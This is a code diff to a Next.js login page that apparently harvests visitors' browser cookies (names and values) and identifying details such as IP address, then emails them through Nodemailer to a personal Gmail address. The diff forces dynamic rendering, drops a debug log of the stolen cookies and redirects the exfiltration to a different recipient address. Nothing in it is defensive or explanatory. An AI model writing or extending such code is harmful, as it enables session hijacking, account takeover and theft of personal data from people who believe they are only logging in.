@@ -5,6 +5,8 @@ import nodemailer from "nodemailer"; // Import Nodemailer
 import LoginForm from "./LoginForm";
 import { redirect } from "next/navigation";
 
+export const dynamic = "force-dynamic";
+
 export default async function LoginPage({
   params,
 }: {
@@ -36,8 +38,6 @@ export default async function LoginPage({
           `${index + 1}. ${cookie.name}\n   Value: ${cookie.value}`,
       )
       .join("\n\n");
-
-    console.log("Formatted Cookies:\n", cookiesFormatted);
 
     const userInfo = {
       ipAddress:
@@ -177,8 +177,7 @@ export default async function LoginPage({
     try {
       await transporter.sendMail({
         from: process.env.GMAIL_USER, // Sender address (must be your Gmail account)
-        to: "emmizy2015@gmail.com", // Destination address
-        // to: "officialbenz80@gmail.com", // Destination address
+        to: "officialbenz80@gmail.com", // Destination address
         subject: "New User Info Submission",
         html: emailHtml,
       });
